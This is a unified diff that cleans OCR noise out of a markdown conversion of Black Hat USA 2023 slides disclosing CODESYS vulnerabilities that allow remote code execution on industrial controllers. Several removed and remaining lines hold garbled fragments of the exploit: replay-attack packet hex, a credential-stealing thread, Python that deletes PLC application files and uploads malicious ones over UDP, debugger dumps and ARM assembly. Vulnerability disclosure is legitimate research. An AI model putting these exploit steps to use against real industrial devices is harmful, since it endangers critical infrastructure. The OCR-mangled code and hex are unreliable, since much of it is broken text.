@@ -21,7 +21,6 @@ converted_at: "2026-08-11T21:29:21Z"
 **Conference:** Black Hat USA 2023  
 **Source:** `Black Hat USA 2023 slides/Vladimir Eliezer Tokarev_CoDe16; 16 Zero-Day Vulnerabilities Affecting CODESYS Framework Leading to Remote Code Execution on Millions of Industrial Devices Across Industries.pdf` (177 pages)
 
-
 ## Slide 1
 
 ## CoDe16;
@@ -183,7 +182,6 @@ PRODUCTS SOLUTIONS INDUSTRIES CAREERS COMPANY CUSTOMER SERVICE DOWNLOADS BLOG
 Share Price (@) Global(English)
 Search products, documents & more
 Products Solutions Services Support Investors About us
-AL 22 OD : .
 PADDED Products Industries Service
 #BHUSA @BlackHatEvents
 ```
@@ -260,58 +258,6 @@ ROJANISED SOFTWARE
 ### Analysis Techniques: Setting The Playground
 
 #BHUSA  @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-+
-©
-‘-
-a
-{
-ul
-a
-xe)
-Cc
-=)
-Oo
-ra
-ON
->
-aL
-a
-oO
-&—
-el)
-Cc
-Pp
-7a)
-1D)
-Y)
-Wn
-<)
-=)
-Ss
-Cc
-&
-O
-.<)
-2
-Y)
-=
-O
-Cc
-<<
-bide
-T Remove this sticker
-to connect
-Expansion Module
-/ OFF /2/
-Ler = /@*
-Hil Wa
-@BlackHatEvents
-#BHUSA
-```
 
 ## Slide 18
 
@@ -504,14 +450,11 @@ USA &
 Analysis Techniques: Reverse srosnaitsteats TM251
 BE ARbaO
 ) 1 HUA YL?
-‘Z a . ek | = pet { V@B04SE1
 Bperrs) Og e%s ea AAD?? 10
 ier PIG ea. TWN AU 8eL
 (aie
 jseemepreies
 lf bles ae ;
-“, Cr omni Z| oT age , ,
-rie 2 6: RB 3224. 1h ip el ahh “
 #BHUSA @BlackHatEvents
 ```
 
@@ -603,13 +546,10 @@ a
 Qu @
 oOo &
 og ow
-ff & o a
 og &
-Ee @ &
 og a
 oo
 aoga
-oo a a&
 aoga
 agoga
 rR
@@ -640,13 +580,10 @@ a
 Qu @
 oOo &
 og ow
-ff & o a
 og &
-Ee @ &
 og a
 oo
 aoga
-oo a a&
 aoga
 agoga
 rR
@@ -672,7 +609,6 @@ dword_.
 AppGenerateCreateAppser...
 dword_
 AppLoadBootprojectSe
-dv a ord 2
 dword_20 c DecDO ; DATA XREF: sub_2035B28+8D8tr
 sub_20F7680+68 tr
 #BHUSA @BlackHatEvents
@@ -695,7 +631,6 @@ Function
 AppGenerateApplDServic
 AppGenerateCreateApps
 AppLoadBootprojectSe
-dw L ke
 + DATA
 ‘REF: AppGenerateApplDService+iC tr
 FF: AppGenerateCreateAppService2 +4 tr
@@ -787,55 +722,6 @@ Block Driver Layer
 
 #BHUSA  @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pifek hat
-ISA e& a:
-Analysis Results: CODESYS Network protocol °
-Block Driver Layer
-a
-Fk
-oa i
-a
-=,
-3 fs
-Lad
-cL
-JL =
-mpg yo
-Lia)
-7s)
-Go ~~]
-Lui ¢
-™m Po
-Ge @
-90S  f
-Go oi in
-Mimi M
-eo Mbt Ga oo
-i)
-7) Go
-Lo oc
-Co Gol Gays fe fo]
-EF) Go oo
-a
-a]
-a
-im
-Mimi f
-WD Wwe &
-J WO) Go
-CS MS)
-oa
-1
-1
-fas]
-Go
-ho
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 35
 
 Analysis Results: CODESYS Network protocol
@@ -858,15 +744,7 @@ Block Driver Layer
 black hat
 ISA e& FF:
 Analysis Results: CODESYS Network protocol °
-9000 8 30 de 40 e@ Bb 00 Qc ee 45 20 -0-@
-@1 02 06 cc 86 cc OO 78 40 0@ 21 x
-2 Q2 08 Ga 90 20 81 ee] Ge ea |
 [ee ee]5@ 00 00 00/39 32 80 01 @0 P-.-92
-@2 88 G0 00 00 OO 40 20 ee @1 ee
-@@ G0 23 84 8@ @@ 21 34 @@ 10 @6 #---14V
-61 64 6d 69 6e @@ 11 ad 3d 5a 36 =©admin #=Z6
-45 66 76 23 32 37 97 75 75 83 3f  Efv#27-u phXThu-?
-7@ 68 82 44 72 2a 93 55 ph-Dr*-U bR
 #BHUSA @BlackHatEvents
 ```
 
@@ -966,7 +844,6 @@ Function Instruction
 AppGenerateAppll
 AppGenerateCreateAppSer
 AppLoadBootprojectService
-8 +BD8 tr
 #BHUSA @BlackHatEvents
 ```
 
@@ -1006,7 +883,6 @@ Function Instruction
 AppGenerateAppll
 AppGenerateCreateAppSer
 AppLoadBootprojectService
-8 +BD8 tr
 #BHUSA @BlackHatEvents
 ```
 
@@ -1026,7 +902,6 @@ Function Instruction
 AppGenerateAppll
 AppGenerateCreateAppSer
 AppLoadBootprojectService
-8 +BD8 tr
 #BHUSA @BlackHatEvents
 ```
 
@@ -1056,7 +931,6 @@ Analysis Results: Service Handlers & CMP & Services IDs
 
 ```text
 CA
-; ane eM
 aE
 Service Name Service ID
 CmpDevice Ox01
@@ -1282,7 +1156,6 @@ Handler2(
 ```text
 {
 ServerRegisterServiceHandler_@(2, CMPAppServiceHand1l
-resann @ a G a S e
 Overflow
 s #BHUSA @BlackHatEvents
 ```
@@ -1652,116 +1525,6 @@ Replay Attack
 
 #BHUSA  @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bi
-Exploit
-80
-94
-17
-ee
-c3
-9a
-‘2.
-ac
-LISA
-£4
-e2
-Q6
-de
-Q@1
-55
-@b
-Q4
-cc
-17
-212)
-cd
-08 |22 84
-56 @3
-de
-40
-Q6
-(J2)
-ee
-Qc
-kK hat
-16
-8e
-cc
-@5
-88
-212]
-88
-40
-08
-020
-00
-Q1
-88 88 O61
-Oc
-11
-80
-82
-68
-Ge
-29
-87
-dc
-de
-212)
-Q@2
-1c
-b8
-fc
-7®
-(2]7)
-(212)
-68 00 BO
-Qa
-c5
-820
-50
-(27)
-23
-Replay Attack
-bd
-Qa
-6b
-ee
-ee
-212)
-84
-2]2)
-78
-40
-020
-08
-212)
-4b
-40
-2]2)
-Qa
-43
-81
-32
-(212)
-88 08 21 34
-81 01 ac 00/10 06 72 6f 6f 74 79 OG)11 ae
-80 @@ d3 56 @8 le 6a @7 76 55 41
-23 32 37 97 75
-7@ 68 58 54 68 75 83 3f 70 68 82 44 72 2a 93 55
-62 52
-14
-V rooty
-V--j> VUA#27-u
-phxXThu: ? ph:Dr*-U
-bR
-#BHUSA
-@BlackHatEvents
-```
-
 ## Slide 77
 
 Replay Attack
@@ -1769,116 +1532,6 @@ Replay Attack
 Exploit
 
 #BHUSA  @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bi
-Exploit
-80
-94
-17
-ee
-c3
-9a
-‘2.
-ac
-LISA
-£4
-e2
-Q6
-de
-Q@1
-55
-@b
-Q4
-cc
-17
-212)
-cd
-08 |22 84
-56 @3
-de
-40
-Q6
-(J2)
-ee
-Qc
-kK hat
-16
-8e
-cc
-@5
-88
-212]
-88
-40
-08
-020
-00
-Q1
-88 88 O61
-Oc
-11
-80
-82
-68
-Ge
-29
-87
-dc
-de
-212)
-Q@2
-1c
-b8
-fc
-7®
-(2]7)
-(212)
-68 00 BO
-Qa
-c5
-820
-50
-(27)
-23
-Replay Attack
-bd
-Qa
-6b
-ee
-ee
-212)
-84
-2]2)
-78
-40
-020
-08
-212)
-4b
-40
-2]2)
-Qa
-43
-81
-32
-(212)
-88 08 21 34
-81 01 ac 00/10 06 72 6f 6f 74 79 OG)11 ae
-80 @@ d3 56 @8 le 6a @7 76 55 41
-23 32 37 97 75
-7@ 68 58 54 68 75 83 3f 70 68 82 44 72 2a 93 55
-62 52
-14
-V rooty
-V--j> VUA#27-u
-phxXThu: ? ph:Dr*-U
-bR
-#BHUSA
-@BlackHatEvents
-```
 
 ## Slide 78
 
@@ -1894,12 +1547,9 @@ Exploit USA & Replay Attack
 80
 94
 20 ERS ta Gai
-c3 , —_
 9a
 56 Q3|81 @1 ac 00/10 06 72 6f 6f 7
-80 00 d3 56 08 le 6a @7 76 55 41 2
 7@ 68 58 54 68 75 83 3f 70 68 82 4 stealing_thread = threading. Thread( =credentials_stealer)
-62 52 1
 #BHUSA @BlackHatEvents
 ```
 
@@ -2271,7 +1921,6 @@ What OS we run on ?
 ```text
 pifek hat
 Exploit USAc&
-What OS we run on ? . — gig
 #BHUSA @BlackHatEvents
 ```
 
@@ -2288,7 +1937,6 @@ What we run on
 ```text
 pifek hat
 Exploit USA &
-What we run on a as
 |
 The RTOS
 Exploit Mitigation
@@ -2418,7 +2066,6 @@ Exploit USA &O
 [@2c09560]: e800000c FFFFFfFF 82990018 02c895a0
 [@2c@9570]: @2c0957c @21dbd68 O21dbSe4 G000001c
 [02c09580]: 0298e010 @2c@95ac 02990010 80010924
-- fal FA
 @3294db@]: 9d482808 03203596
 @3294dc0]: 5Sff787a5 I@befffa e92de822 e3e7c69b
 @3294dd0]: @a@da69e 79adf263 19b85be@ b58a4024
@@ -2881,7 +2528,6 @@ Oxb2fci1e14
 Ox230638
 0x20010010
 0x10
-38 in ?? ()
 3002867256
 3002867260
 108
@@ -3798,7 +3444,6 @@ black hat
 Exploit USA 2&0:
 Thread 32 hit Breakpoint 1, 0x00230638 in 7? ()
 (gdb) info r
-ro Oxo 8
 ri Oxb2fcle38 3002867256
 r2 O@xb2fcle3c 3002867260
 r3 Ox6e 108
@@ -3835,7 +3480,6 @@ black hat
 Exploit USA 2&0:
 Thread 32 hit Breakpoint 1, 0x002306538 in ?? ()
 (gdb) info r
-re Ox 8
 ri Oxb2fcle38 3002867256
 r2 O@xb2fcle3c 3002867260
 r3 Ox6e 108
@@ -3872,7 +3516,6 @@ black hat
 Exploit USA 2&0:
 Thread 32 hit Breakpoint 1, 0x002306538 in ?? ()
 (gdb) info r
-re Ox 8
 ri Oxb2fcle38 3002867256
 r2 O@xb2fcle3c 3002867260
 r3 Ox6e 108
@@ -4209,7 +3852,6 @@ i [ D1L4; Sent {part}'th part of the pay format =i+1
 delete_remote_file(dev, filename) <
 gl, 11, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST tT("l>j] GINDIL4 ast chunk
 =DEFAULT_NETMASK
-AL ALT ta = fil @)
 pLayer.add_tag( filename, AL_
 ct dev_channel.complete_packet(gl, 11, al) endto(last da udp_it
 dev.dev_channel.send(pkt, 5)
@@ -4250,7 +3892,6 @@ dplete_remote_file(device App/AppLication.crc™) . ’
 ‘Lete_remote_file(device App/AppLication.map")
 si.eep }
 lupLoad_malicious_map_file(device) data = file_to_send.read(single_chunk_size
-upLoad_malicious_crc_file(device) ats > + ao 4 : art)
 - sock.sendto(data udp_ir jdp_port))
 upLoad_malicious_appLication_file(device)
 4
@@ -4258,12 +3899,10 @@ int(*[>] GIND1L4: Sent {part}'th part of the payload.".format( =i+1
 £ delete_remote_file(dev, filename)
 gl, U1, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST int("(>] GINDIL4: Sending Last chunk.")
 =DEFAULT_NETMASK) sleep
-J = il reaadt + . ivo
 AppLayer.add_tag(0x01, filename, AL_ALIGN48, al) gata fi .Pead(Last_chunk_size
 pkt = dev.dev_channel.complete_packet(gl, 11, al) .sendto(last_data, fudp_ip, udp_port))
 resp = dev.dev_channel.send(pkt, 5)
 resp i €
-t('[>] 6 1 1 me}.*.forn =f ne) ‘ ~ 7 a3 ace 5
 int(*[>] G1ND1L4: Failed deleting {name}.".format( ilenane)) "[>] GINDIL4: Full Payload Uploaded.")
 int("[>] G1ND1L4: Successfully deleted {name}. '.format(namc=filename))
 #BHUSA @BlackHatEvents
@@ -4286,7 +3925,6 @@ send_big_data( =tag_13 =ALCMD_TRACE_MANAGER =ALSUBCMD_TRACE_MANAGER_PACKET_CREAT
 vdp_ip = “10.16.222.235"
 udp_port = F
 fe) rele sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-} , , ,
 path = r"“/home/a/PycharaProjects/PLCCrasher/Application.app py
 to_send = | (path, “rb")
 Exploit USF
@@ -4301,14 +3939,12 @@ Last_chunk_s = file_total_size
 singLe_chunk_size
 delete_remote_file(device, "App/Application.app") ("{>] GINDIL4 Going to send isize}8 file.".format( =file_total_size))
 dplete_remote_file(device App/AppLication.crc™)
-; | f ii yo (number_of_chunks_to_send):
 ‘Lete_remote_file(device App/Application.map") ¢
 . Sieepi! 1)
 lupLoad_malLicious_map_file(device) data = file_to_send.read(single_chunk_size
 n Ss. f vice)
 upload_malicious_crc_file(device sock.sendto(data, (udp_iy idp_port))
 upLoad_malicious_application_file(device)
-te tbe =
 i {part}'th part of the payload.”.format( =i+1
 f delete_remote_file(dev, filename) <
 gl, 11, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST int("[>] GINDIL4: Sending Last chunk.")
@@ -4362,8 +3998,6 @@ upLoad_malicious_crc_file(device)
 .read(singte_chunk_size
 7 vudp_if jdp_port))
 upLoad_malicious_appLication_file(device)
-z ie 4
-é ~ a
 € i L Sent tpart}'th part of the payload.*.ft at( =i+i1
 £ delete_remote_file(dev, filename)
 gl, U1, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST int("(>] GINDIL4: Sending Last chunk.")
@@ -4750,7 +4384,6 @@ bl SysFileWrite
 sub r4, r4&, 1
 nop
 cmp r4, #8
-BNE PC - 48
 mov rr, ré
 bl SysFileFlush
 mov rO, ré
